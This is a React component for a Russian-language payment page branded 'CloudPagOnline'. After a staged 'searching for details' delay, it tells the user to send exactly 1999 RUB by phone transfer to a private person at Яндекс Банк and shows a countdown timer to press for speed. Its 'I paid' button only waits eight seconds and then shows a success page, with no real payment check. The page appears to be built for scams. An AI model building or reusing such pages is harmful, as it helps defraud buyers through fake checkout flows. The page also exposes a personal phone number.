import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Loader2, Copy, CheckCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";

const Payment = () => {
  const navigate = useNavigate();
  const [stage, setStage] = useState<'searching' | 'details' | 'verifying'>('searching');
  const [countdown, setCountdown] = useState(600);
  const [copied, setCopied] = useState(false);
  const [orderId] = useState(() => {
    const chars = '0123456789abcdef';
    let id = '';
    for (let i = 0; i < 24; i++) {
      id += chars[Math.floor(Math.random() * chars.length)];
      if ([7, 11, 15].includes(i)) id += '-';
    }
    return id;
  });

  useEffect(() => {
    const timer = setTimeout(() => {
      setStage('details');
    }, 13000);

    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (stage === 'details') {
      const interval = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      return () => clearInterval(interval);
    }
  }, [stage]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handlePaid = () => {
    setStage('verifying');
    setTimeout(() => {
      navigate('/success');
    }, 8000);
  };

  if (stage === 'searching') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center">
          <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-200">
            <h1 className="text-2xl font-bold text-gray-900 mb-6">CloudPagOnline</h1>
            <p className="text-gray-600 mb-2">Заказ № {orderId.substring(0, 20)}</p>
            <Loader2 className="w-16 h-16 text-blue-600 animate-spin mx-auto my-8" />
            <p className="text-gray-700 font-medium">Поиск реквизитов для оплаты...</p>
            <div className="mt-6 text-sm text-gray-500">
              Визуальный таймер: 3:00
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (stage === 'verifying') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center">
          <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-200">
            <h1 className="text-2xl font-bold text-gray-900 mb-6">Проверка платежа</h1>
            <Loader2 className="w-16 h-16 text-blue-600 animate-spin mx-auto my-8" />
            <div className="w-full bg-gray-200 rounded-full h-3 mb-4">
              <div className="bg-blue-600 h-3 rounded-full animate-pulse" style={{ width: '75%' }}></div>
            </div>
            <p className="text-gray-700 font-medium">Подтверждение транзакции...</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4 py-12">
      <div className="max-w-2xl mx-auto">
        <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 border border-gray-200">
          <div className="text-center mb-8">
            <CheckCircle className="w-16 h-16 text-green-600 mx-auto mb-4" />
            <h1 className="text-3xl font-bold text-gray-900 mb-2">✅ Реквизиты найдены</h1>
            <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mt-4">
              <p className="text-yellow-800 font-medium">⚠️ Переводите точную сумму, иначе перевод не зачислится</p>
            </div>
          </div>

          <div className="space-y-4 mb-8">
            <div className="bg-gray-50 p-4 rounded-lg">
              <p className="text-gray-600 text-sm mb-1">ID платежа</p>
              <div className="flex justify-between items-center">
                <p className="text-xl font-bold text-gray-900">272675788</p>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => copyToClipboard('272675788')}
                >
                  <Copy className="w-4 h-4" />
                </Button>
              </div>
            </div>

            <div className="bg-blue-50 p-4 rounded-lg border-2 border-blue-500">
              <p className="text-gray-600 text-sm mb-1">Сумма</p>
              <p className="text-3xl font-bold text-blue-700">1999.00 RUB</p>
            </div>

            <div className="bg-gray-50 p-4 rounded-lg">
              <p className="text-gray-600 text-sm mb-1">Номер телефона</p>
              <div className="flex justify-between items-center">
                <p className="text-xl font-bold text-gray-900">+7 981 848 79 57</p>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => copyToClipboard('+79818487957')}
                >
                  <Copy className="w-4 h-4" />
                </Button>
              </div>
            </div>

            <div className="bg-gray-50 p-4 rounded-lg">
              <p className="text-gray-600 text-sm mb-1">ФИО получателя</p>
              <p className="text-lg font-semibold text-gray-900">Людмила С.</p>
            </div>

            <div className="bg-gray-50 p-4 rounded-lg">
              <p className="text-gray-600 text-sm mb-1">Банк</p>
              <p className="text-lg font-semibold text-gray-900">Яндекс Банк</p>
            </div>
          </div>

          <Accordion type="single" collapsible className="mb-8">
            <AccordionItem value="instructions" className="border rounded-lg px-4">
              <AccordionTrigger className="text-blue-600 hover:text-blue-700">
                📖 Инструкция по оплате
              </AccordionTrigger>
              <AccordionContent className="text-gray-700 space-y-2 pt-4">
                <p>1. Откройте приложение вашего банка</p>
                <p>2. Выберите "Переводы" → "По номеру телефона"</p>
                <p>3. Введите номер: +7 981 848 79 57</p>
                <p>4. Укажите сумму: 1999.00 RUB</p>
                <p>5. Проверьте, что получатель: Людмила С. (Яндекс Банк)</p>
                <p>6. Подтвердите перевод</p>
                <p>7. После успешной оплаты нажмите кнопку "Я ОПЛАТИЛ"</p>
              </AccordionContent>
            </AccordionItem>
          </Accordion>

          <div className="space-y-4">
            <Button
              onClick={handlePaid}
              className="w-full py-6 text-lg font-bold bg-green-600 hover:bg-green-700 text-white"
            >
              ✅ Я ОПЛАТИЛ
            </Button>

            <Button
              onClick={() => navigate('/results')}
              variant="outline"
              className="w-full py-6 text-lg font-bold"
            >
              ❌ ОТМЕНИТЬ
            </Button>
          </div>

          <div className="mt-6 text-center">
            <p className="text-gray-600">
              Время до отмены: <span className={`font-bold ${countdown < 60 ? 'text-red-600 animate-pulse' : 'text-gray-900'}`}>
                {formatTime(countdown)}
              </span>
            </p>
          </div>

          {copied && (
            <div className="fixed top-4 right-4 bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg">
              Скопировано!
            </div>
          )}
        </div>

        <div className="text-center mt-8 text-sm text-gray-500">
          <p>Платежный сервис по приему платежей. © 2025 (СБП)</p>
        </div>
      </div>
    </div>
  );
};

export default Payment;
